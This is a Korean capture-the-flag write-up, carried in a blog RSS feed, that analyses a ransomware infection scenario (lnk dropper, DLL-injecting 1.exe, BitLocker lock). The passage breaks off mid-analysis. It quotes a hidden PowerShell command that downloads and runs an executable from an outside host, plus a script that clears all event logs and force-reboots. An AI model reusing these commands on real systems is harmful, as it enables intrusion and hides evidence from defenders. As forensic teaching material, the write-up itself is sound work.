<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>TouBVa</title>
    <description>Harder than you thought, easier than you expected</description>
    <link>https://touBVa.github.io/</link>
    <atom:link href="https://touBVa.github.io/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Sun, 02 Feb 2025 07:06:33 -0600</pubDate>
    <lastBuildDate>Sun, 02 Feb 2025 07:06:33 -0600</lastBuildDate>
    <generator>Jekyll v4.2.2</generator>

    
      <item>
        <title>FIESTA2024 침해대응 1 풀이</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-초기-접근&quot; id=&quot;markdown-toc-0-초기-접근&quot;&gt;0. 초기 접근&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-파일-분석&quot; id=&quot;markdown-toc-1-파일-분석&quot;&gt;1. 파일 분석&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#10-wipingps1&quot; id=&quot;markdown-toc-10-wipingps1&quot;&gt;1.0. wiping.ps1&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#11-국내코로나19재감염사례현황pdflnk&quot; id=&quot;markdown-toc-11-국내코로나19재감염사례현황pdflnk&quot;&gt;1.1. 국내코로나19재감염사례현황.pdf.lnk&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#121exe&quot; id=&quot;markdown-toc-121exe&quot;&gt;1.2.1.exe&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#13-국내코로나19재감염사례현황pdf&quot; id=&quot;markdown-toc-13-국내코로나19재감염사례현황pdf&quot;&gt;1.3. 국내코로나19재감염사례현황.pdf&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-dll-인젝션을-활용하는-악성코드-분석1exe&quot; id=&quot;markdown-toc-2-dll-인젝션을-활용하는-악성코드-분석1exe&quot;&gt;2. dll 인젝션을 활용하는 악성코드 분석(1.exe)&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-시도-내부-스트링-확인&quot; id=&quot;markdown-toc-21-시도-내부-스트링-확인&quot;&gt;2.1. (시도) 내부 스트링 확인&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#21-암호화-루틴-접근&quot; id=&quot;markdown-toc-21-암호화-루틴-접근&quot;&gt;2.1. 암호화 루틴 접근&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-sub_1400749c0-분석&quot; id=&quot;markdown-toc-22-sub_1400749c0-분석&quot;&gt;2.2. sub_1400749C0 분석&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-암호화-쉘스크립트-다운로더-분석encexe&quot; id=&quot;markdown-toc-3-암호화-쉘스크립트-다운로더-분석encexe&quot;&gt;3. 암호화 쉘스크립트 다운로더 분석(enc.exe)&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#31-overview&quot; id=&quot;markdown-toc-31-overview&quot;&gt;3.1. Overview&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#32-sub_405220-분석&quot; id=&quot;markdown-toc-32-sub_405220-분석&quot;&gt;3.2. sub_405220 분석&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#33-sub_401e80-분석&quot; id=&quot;markdown-toc-33-sub_401e80-분석&quot;&gt;3.3. sub_401E80 분석&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-암호화-쉘스크립트-분석lockps1&quot; id=&quot;markdown-toc-4-암호화-쉘스크립트-분석lockps1&quot;&gt;4. 암호화 쉘스크립트 분석(lock.ps1)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Description :&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;직원 A씨는 어느 날 PC가 랜섬웨어에 감염된 사실을 알게되었다.
랜섬웨어에 의해 잠긴 파티션 속에는 중요한 대외비 자료가 보관 중이었다.
이에 긴급하게 분석을 맡기게 되었고, 당신은 해당 자료를 무사히 복구해야 하는 상황에 처했다.&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;문제 :&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;(1) dll인젝션에 사용된 dll 파일명 (.dll 포함)&lt;/p&gt;

  &lt;p&gt;(2) 비트라커의 평문키&lt;/p&gt;

  &lt;p&gt;(3) 암호화된 파티션 내부 설계도면에 적힌 가격&lt;/p&gt;

  &lt;p&gt;flag 형식 = FIESTA{(1)_(2)_(3)}&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-초기-접근&quot;&gt;0. 초기 접근&lt;/h1&gt;

&lt;p&gt;처음 알았는데, 이런 식으로 침해당한 OS 이미지를 주면 VM에 띄워보는 게 아니라 FTK Imager에 띄우는 게 정석이었나 보다.&lt;/p&gt;

&lt;p&gt;전형적인 랜섬웨어 공격이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;피해자들은 보통 파일을 다운로드 및 실행함으로써 랜섬웨어에 감염된다.&lt;/p&gt;

&lt;p&gt;따라서 최근에 사용한 파일이 무엇인지 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%201.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;저 두 개가 진짜 문제 같아 보인다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%202.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아니나 다를까 해당 파일의 위치로 가 보니 MAC Time이 비슷한 파일 3개가 보인다.&lt;/p&gt;

&lt;p&gt;해당 파일을 분석 대상으로 결정하고, 이번에는 확장자가 .pdf인 바로 가기 파일을 확보하기 위해 다시 최근 파일로 돌아왔다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%203.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그러나 해당 바로 가기 파일은 삭제되어 있었다. 악성 행위가 진행되며 흔적이 될 수 있는 파일을 지운 것으로 추정된다.&lt;/p&gt;

&lt;p&gt;어쨌든 4개 파일을 모두 확보했고, C-TIME과 M-TIME에 기반한 순서 및 이벤트 로거에서 확인한 정보 토대로 가볍게 분석해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%204.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;국내코로나19재감염사례현황.pdf&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%205.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;국내코로나19재감염사례현황.pdf.lnk&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%206.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.exe&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%207.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wiping.ps1&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%208.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이벤트 로거 확인 모습 -경고 로그, 저 시점에 BitLocker 암호화가 되었음&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%209.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;저 시점 이전에 ID 403(파워쉘 코드 실행 중지) 및 ID 600이 모여 있는 게 보인다.&lt;/p&gt;

&lt;p&gt;403부터 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2010.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;wiping.ps1이 실행된 것이 볼륨 암호화와 연관이 있을 확률이 높아 보인다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;pdf 파일을 열어봄으로써 악성코드가 드롭/다운로드되어 실행되었다는 시나리오일 것으로 추정된다.&lt;/p&gt;

&lt;p&gt;그리고 저 시점 이전의 이벤트 로그가 싹 지워져 있는데, 이건 악성 행위에 이벤트 로그를 지우는 행위가 포함되어 있기 때문으로 추정된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-파일-분석&quot;&gt;1. 파일 분석&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;10-wipingps1&quot;&gt;1.0. wiping.ps1&lt;/h2&gt;

&lt;p&gt;파워쉘 코드는 가장 분석이 쉽기 때문에 최우선적으로 확인했다.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$filePath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\Public\lock.ps1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Test-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filePath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Remove-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filePath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wevtutil&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;el&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wevtutil&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Start-Sleep&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Seconds&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;300&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Restart-Computer&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock.ps1&lt;/code&gt; 파일을 지워버리고&lt;/p&gt;

&lt;p&gt;이벤트 로그 지우는 게 맞다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;11-국내코로나19재감염사례현황pdflnk&quot;&gt;1.1. 국내코로나19재감염사례현황.pdf.lnk&lt;/h2&gt;

&lt;p&gt;바로 가기 파일의 동작은 무엇을 가리키는지가 핵심이다.&lt;/p&gt;

&lt;p&gt;따라서 속성 보기를 통해 무엇을 대상으로 하는지 확인했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2011.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;파워쉘을 실행하는 링크 파일이다.&lt;/p&gt;

&lt;p&gt;그런데 좀 이상하다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2012.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;링크 파일이라기엔 너무 크다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;자세한 내용을 알기 위해 HxD로 내부 내용을 확인했… 는데, HxD는 lnk 자체의 데이터를 보여주는 게 아니라, lnk가 가리키는 파일의 데이터를 보여주더라.&lt;/p&gt;

&lt;p&gt;010 Editor를 사용했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2013.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;내부에 커맨드가 있는 것을 확인할 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;/c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-windowstyle&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hidden&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-command&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Set-Location -Path &apos;C:\Users\Public&apos;; Invoke-WebRequest -Uri &apos;http://172.22.224.1:7777/123.pdf&apos; -OutFile &apos;C:\Users\Public\국내코로나19재감염사례현황.pdf&apos;; Invoke-WebRequest -Uri &apos;http://172.22.224.1:7777/1.exe&apos; -OutFile &apos;C:\Users\Public\1.exe&apos;; Start-Process -FilePath &apos;C:\Users\Public\국내코로나19재감염사례현황.pdf&apos;; Start-Process -FilePath &apos;C:\Users\Public\1.exe&apos;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;pdf 파일과 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.exe&lt;/code&gt;를 다운받아 실행시키는 커맨드다.&lt;/p&gt;

&lt;p&gt;pdf 파일 자체에 문제가 있을 수도 있지만, 이 경우에는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.exe&lt;/code&gt;가 드로핑을 위한 DB 정도로 pdf  파일을 사용할 수도 있겠다는 생각이 들었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;121exe&quot;&gt;1.2.1.exe&lt;/h2&gt;

&lt;p&gt;Virustotal에 먼저 넣고 돌려 보았다. 샌드박스 프로그램 쓰고 싶은데 맨날 계정 만드는 걸 까먹는다;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2014.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;대박 개쩌는 악성파일이다&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;주요 행위를 정리해 동작 메커니즘을 추론해 보았다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;악성 dll 다운로드&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2015.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;악성 dll injection
    &lt;ul&gt;
      &lt;li&gt;dll을 다운로드했기 때문에, 분석 결과에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version.dll&lt;/code&gt;을 검색해 Files Written에 있는 주요 시스템 파일과 동일한 파일명인지를 확인했다.&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2016.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;자동으로 인터넷 검색 쿠키를 지움
    &lt;ul&gt;
      &lt;li&gt;이는 사용자가 어디에서 악성 파일을 입수했는지 파악이 어렵게 하기 위한 것으로 정&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2017.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;추가 PE 다운로드
    &lt;ul&gt;
      &lt;li&gt;뭔가 저 version[1].dll은 version.dll 인젝션으로 인해 드롭된 파일 같음&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2018.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;(추가 증적) 쉘 커맨드&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2019.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;키 생성 및 암호화&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2020.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;즉, 여기에서 첫 번째 문항을 해결할 수 있다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;mark&gt;(1) dll인젝션에 사용된 dll 파일명 (.dll 포함): version.dll&lt;/mark&gt;&lt;/p&gt;

  &lt;p&gt;(2) 비트라커의 평문키&lt;/p&gt;

  &lt;p&gt;(3) 암호화된 파티션 내부 설계도면에 적힌 가격&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;13-국내코로나19재감염사례현황pdf&quot;&gt;1.3. 국내코로나19재감염사례현황.pdf&lt;/h2&gt;

&lt;p&gt;해당 파일은 주요 악성 행위를 수행하는 1.exe에서 참조하지 않는 관계로, 확인하지 않음&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-dll-인젝션을-활용하는-악성코드-분석1exe&quot;&gt;2. dll 인젝션을 활용하는 악성코드 분석(1.exe)&lt;/h1&gt;

&lt;p&gt;version.dll 인젝션하는 포인트 전후로 뭔가 하겠지..&lt;/p&gt;

&lt;p&gt;해당 악성코드는 stripped &amp;amp; obfuscated된 악성코드다.&lt;/p&gt;

&lt;p&gt;근데 샌드박스에서 돌렸을 때 get request를 날리거나, 커맨드라인을 실행하는 모습을 보였음&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;즉, 내부에 관련 스트링을 가지고 있을 가능성이 높음&lt;/li&gt;
  &lt;li&gt;아니면 인코딩된 스트링을 디코딩하든가&lt;/li&gt;
  &lt;li&gt;그런데 어쨌든 httprequest는 보내겠지&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이제 저 순서대로 분석하면 되지 않을까&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;21-시도-내부-스트링-확인&quot;&gt;2.1. (시도) 내부 스트링 확인&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2021.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;?&lt;/p&gt;

&lt;p&gt;String Subview 켜자마자 보였음&lt;/p&gt;

&lt;p&gt;머쓱…&lt;/p&gt;

&lt;p&gt;그럼 소제목을 다시 써야 할 것 같다&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;21-암호화-루틴-접근&quot;&gt;2.1. 암호화 루틴 접근&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2021.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;저 스트링을 어디에서 참조하는지 확인해 보자.&lt;/p&gt;

&lt;p&gt;단순히 단축키 x를 눌러서 xref를 찾는 것만으로는 참조 위치가 나오지 않는다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;개인적으로 이런 경우에 대한 추측인데,&lt;/p&gt;

&lt;p&gt;이는 코드에서 다이렉트로 해당 스트링의 시작 주소를 참조하는 게 아닌&lt;/p&gt;

&lt;p&gt;해당 스트링을 가리키는 타 포인터 변수(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aHttpsGithubCom&lt;/code&gt;)를 참조해서 그런 것 같다.&lt;/p&gt;

&lt;p&gt;xref의 경우 이 스트링을 참조하는 ‘코드’ 포인트를 보여주는 거지 이 스트링을 가리키는 포인터를 보여주는 게 아니라 xref 정보가 없는 것으로 보인다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;하지만 다 방법이 있다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;해당 스트링의 위치로 가면 이 스트링의 변수명이 함께 명시되어 있다.&lt;/p&gt;

&lt;p&gt;그 옆에 있는 DATA XREF 위치가 해당 변수를 참조하는 코드 위치이므로 거기로 가도 좋고&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2022.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이 스트링의 주소에 대한 모든 xref 그래프(xref to this address)를 조회할 수도 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2023.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2024.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1400749C0&lt;/code&gt; 함수에서 접근함을 알 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;22-sub_1400749c0-분석&quot;&gt;2.2. sub_1400749C0 분석&lt;/h2&gt;

&lt;p&gt;해당 함수를 Disassemble하면 아래와 같은 내용을 확인할 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2025.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;와 윈도우 폴더를 두 개 만들어 버리네&lt;/p&gt;

&lt;p&gt;와 저런 식으로 오버라이드를 해버리네&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그런데 우리가 잊지 말아야 할 게 있음&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2026.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;이 악성파일은 저 깃헙 레포에 수상할 정도로 많이 접근함&lt;/p&gt;

&lt;p&gt;그리고 이쯤에서 다시 꺼내보는 wiping.ps1&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$filePath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\Public\lock.ps1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

